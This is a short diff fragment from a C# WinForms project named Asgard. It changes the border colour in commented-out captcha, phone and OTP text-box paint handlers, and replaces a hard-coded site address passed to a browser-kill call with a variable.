-        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxCaptcha, Color.Black, ButtonBorderStyle.Solid);
+        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxCaptcha, Color.White, ButtonBorderStyle.Solid);
         //}
 
         //private async void IconButtonCaptcha_Click(object sender, EventArgs e)
@@ -2731,18 +2775,18 @@ namespace Asgard
         //{
         //    Rectangle borderTextBoxNativePhone = new Rectangle(TextBoxNativePhone.Location.X, TextBoxNativePhone.Location.Y, TextBoxNativePhone.ClientSize.Width, TextBoxNativePhone.ClientSize.Height);
         //    borderTextBoxNativePhone.Inflate(1, 1);
-        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxNativePhone, Color.Black, ButtonBorderStyle.Solid);
+        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxNativePhone, Color.White, ButtonBorderStyle.Solid);
 
         //    Rectangle borderTextBoxPhone = new Rectangle(TextBoxPhone.Location.X, TextBoxPhone.Location.Y, TextBoxPhone.ClientSize.Width, TextBoxPhone.ClientSize.Height);
         //    borderTextBoxPhone.Inflate(1, 1);
-        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxPhone, Color.Black, ButtonBorderStyle.Solid);
+        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxPhone, Color.White, ButtonBorderStyle.Solid);
         //}
 
         //private void PanelOTP_Paint(object sender, PaintEventArgs e)
         //{
         //    Rectangle borderTextBoxOTP = new Rectangle(TextBoxOTP.Location.X, TextBoxOTP.Location.Y, TextBoxOTP.ClientSize.Width, TextBoxOTP.ClientSize.Height);
         //    borderTextBoxOTP.Inflate(1, 1);
-        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxOTP, Color.Black, ButtonBorderStyle.Solid);
+        //    ControlPaint.DrawBorder(e.Graphics, borderTextBoxOTP, Color.White, ButtonBorderStyle.Solid);
         //}
 
         private async Task Block()
@@ -2756,7 +2800,7 @@ namespace Asgard
                 PanelBlockGate.Hide();
                 if (browser != null)
                 {
-                    await browser.Kill("www.express.com");
+                    await browser.Kill(web);
                 }
                 this.Close();
             }
